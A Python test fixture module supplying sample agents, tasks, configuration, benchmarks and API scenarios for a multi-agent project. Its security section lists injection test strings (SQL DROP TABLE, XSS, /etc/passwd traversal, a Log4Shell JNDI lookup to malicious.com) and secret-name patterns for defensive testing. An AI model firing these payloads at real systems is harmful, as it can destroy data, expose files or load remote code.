"""
Test Data Providers - Agent_Cellphone_V2_Repository
Foundation & Testing Specialist - Centralized Test Data

Centralized test data to eliminate duplication across test files.
"""

from typing import Dict, Any, List
from datetime import datetime, timedelta


def get_sample_agent_data() -> Dict[str, Any]:
    """Get sample agent data for testing."""
    return {
        "agents": [
            {
                "id": "agent_001",
                "name": "Foundation & Testing Specialist",
                "role": "testing",
                "status": "active",
                "capabilities": ["testing", "quality_assurance", "validation"],
                "priority": "high",
                "workload": 75
            },
            {
                "id": "agent_002", 
                "name": "AI & ML Framework Integration",
                "role": "ai_development",
                "status": "active",
                "capabilities": ["machine_learning", "ai_development", "model_training"],
                "priority": "high",
                "workload": 80
            },
            {
                "id": "agent_003",
                "name": "Web Development Specialist",
                "role": "web_development",
                "status": "active", 
                "capabilities": ["web_frameworks", "ui_development", "frontend"],
                "priority": "medium",
                "workload": 60
            }
        ]
    }


def get_sample_task_data() -> Dict[str, Any]:
    """Get sample task data for testing."""
    return {
        "tasks": [
            {
                "task_id": "task_001",
                "name": "Setup Testing Infrastructure",
                "type": "infrastructure",
                "priority": "high",
                "status": "completed",
                "assigned_agent": "agent_001",
                "created_at": (datetime.now() - timedelta(hours=2)).isoformat(),
                "completed_at": (datetime.now() - timedelta(hours=1)).isoformat(),
                "content": "Implement comprehensive testing framework",
                "metadata": {
                    "category": "foundation",
                    "difficulty": "medium",
                    "estimated_duration": 3600
                }
            },
            {
                "task_id": "task_002",
                "name": "AI Model Integration",
                "type": "ai_development",
                "priority": "high",
                "status": "in_progress",
                "assigned_agent": "agent_002",
                "created_at": (datetime.now() - timedelta(hours=1)).isoformat(),
                "content": "Integrate machine learning models",
                "metadata": {
                    "category": "intelligence",
                    "difficulty": "high",
                    "estimated_duration": 7200
                }
            },
            {
                "task_id": "task_003",
                "name": "UI Component Development",
                "type": "web_development",
                "priority": "medium",
                "status": "pending",
                "assigned_agent": "agent_003",
                "created_at": datetime.now().isoformat(),
                "content": "Develop responsive UI components",
                "metadata": {
                    "category": "frontend",
                    "difficulty": "medium",
                    "estimated_duration": 5400
                }
            }
        ]
    }


def get_sample_config_data() -> Dict[str, Any]:
    """Get sample configuration data for testing."""
    return {
        "system": {
            "name": "Agent_Cellphone_V2_Repository",
            "version": "2.0.0",
            "environment": "testing",
            "debug": True
        },
        "agents": {
            "max_concurrent": 8,
            "coordination_enabled": True,
            "health_monitoring": True,
            "performance_tracking": True
        },
        "testing": {
            "framework": "pytest",
            "coverage_threshold": 85,
            "timeout": 300,
            "parallel_execution": True,
            "markers": ["smoke", "unit", "integration", "performance", "security", "api"]
        },
        "database": {
            "type": "sqlite",
            "path": "test_database.db",
            "pool_size": 10,
            "timeout": 30
        },
        "logging": {
            "level": "DEBUG",
            "format": "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
            "file": "test.log",
            "max_size": "10MB",
            "backup_count": 5
        }
    }


def get_performance_test_data() -> Dict[str, Any]:
    """Get performance test data and benchmarks."""
    return {
        "benchmarks": {
            "task_creation": {
                "max_duration": 0.1,  # 100ms
                "memory_limit": 1048576,  # 1MB
                "cpu_threshold": 50.0  # 50%
            },
            "agent_coordination": {
                "max_duration": 2.0,  # 2 seconds
                "memory_limit": 10485760,  # 10MB
                "cpu_threshold": 75.0  # 75%
            },
            "test_execution": {
                "max_duration": 30.0,  # 30 seconds
                "memory_limit": 52428800,  # 50MB
                "cpu_threshold": 90.0  # 90%
            }
        },
        "load_test_scenarios": [
            {
                "name": "Light Load",
                "concurrent_agents": 2,
                "tasks_per_agent": 5,
                "duration": 60
            },
            {
                "name": "Medium Load",
                "concurrent_agents": 5,
                "tasks_per_agent": 10,
                "duration": 120
            },
            {
                "name": "Heavy Load",
                "concurrent_agents": 8,
                "tasks_per_agent": 20,
                "duration": 300
            }
        ],
        "metrics": {
            "response_time": {
                "excellent": 0.1,
                "good": 0.5,
                "acceptable": 1.0,
                "poor": 5.0
            },
            "throughput": {
                "excellent": 100,  # tasks/minute
                "good": 50,
                "acceptable": 20,
                "poor": 5
            },
            "error_rate": {
                "excellent": 0.01,  # 1%
                "good": 0.05,       # 5%
                "acceptable": 0.10, # 10%
                "poor": 0.20        # 20%
            }
        }
    }


def get_security_test_data() -> Dict[str, Any]:
    """Get security test data and scenarios."""
    return {
        "test_credentials": {
            "valid_user": {
                "username": "test_user",
                "password": "secure_test_password_123",
                "role": "tester"
            },
            "invalid_user": {
                "username": "invalid_user",
                "password": "wrong_password",
                "role": "none"
            }
        },
        "sensitive_data_patterns": [
            "password", "token", "key", "secret", "credential",
            "api_key", "private_key", "ssh_key", "certificate"
        ],
        "safe_data_patterns": [
            "username", "email", "name", "id", "timestamp",
            "version", "status", "type", "category"
        ],
        "injection_test_strings": [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://malicious.com/a}"
        ],
        "security_headers": [
            "Content-Security-Policy",
            "X-Frame-Options", 
            "X-Content-Type-Options",
            "Strict-Transport-Security"
        ]
    }


def get_api_test_data() -> Dict[str, Any]:
    """Get API test data and scenarios."""
    return {
        "endpoints": [
            {
                "method": "GET",
                "path": "/api/agents",
                "expected_status": 200,
                "expected_fields": ["agents", "total", "active"]
            },
            {
                "method": "POST", 
                "path": "/api/agents",
                "payload": {"name": "Test Agent", "role": "testing"},
                "expected_status": 201,
                "expected_fields": ["id", "name", "role", "status"]
            },
            {
                "method": "GET",
                "path": "/api/tasks",
                "expected_status": 200,
                "expected_fields": ["tasks", "total", "pending", "completed"]
            },
            {
                "method": "POST",
                "path": "/api/tasks",
                "payload": {"name": "Test Task", "type": "testing", "priority": "normal"},
                "expected_status": 201,
                "expected_fields": ["task_id", "name", "type", "status"]
            }
        ],
        "error_scenarios": [
            {
                "method": "GET",
                "path": "/api/nonexistent",
                "expected_status": 404
            },
            {
                "method": "POST",
                "path": "/api/agents",
                "payload": {},  # Invalid payload
                "expected_status": 400
            }
        ],
        "rate_limiting": {
            "requests_per_minute": 60,
            "burst_limit": 10,
            "window_size": 60
        }
    }


def get_integration_test_data() -> Dict[str, Any]:
    """Get integration test scenarios."""
    return {
        "workflows": [
            {
                "name": "Agent Onboarding Workflow",
                "steps": [
                    {"action": "create_agent", "agent_type": "testing"},
                    {"action": "assign_role", "role": "tester"},
                    {"action": "activate_agent"},
                    {"action": "verify_status", "expected": "active"}
                ]
            },
            {
                "name": "Task Execution Workflow",
                "steps": [
                    {"action": "create_task", "task_type": "testing"},
                    {"action": "assign_agent", "agent_id": "agent_001"},
                    {"action": "execute_task"},
                    {"action": "verify_completion", "expected": "completed"}
                ]
            },
            {
                "name": "System Health Check Workflow",
                "steps": [
                    {"action": "check_agent_health"},
                    {"action": "check_system_resources"},
                    {"action": "check_database_connection"},
                    {"action": "verify_all_systems", "expected": "healthy"}
                ]
            }
        ],
        "cross_system_tests": [
            {
                "name": "Agent-Task Integration",
                "systems": ["agent_management", "task_scheduling"],
                "test_type": "workflow"
            },
            {
                "name": "Database-API Integration", 
                "systems": ["database", "api_server"],
                "test_type": "data_flow"
            },
            {
                "name": "Monitoring-Alerting Integration",
                "systems": ["health_monitoring", "alert_system"],
                "test_type": "event_driven"
            }
        ]
    }
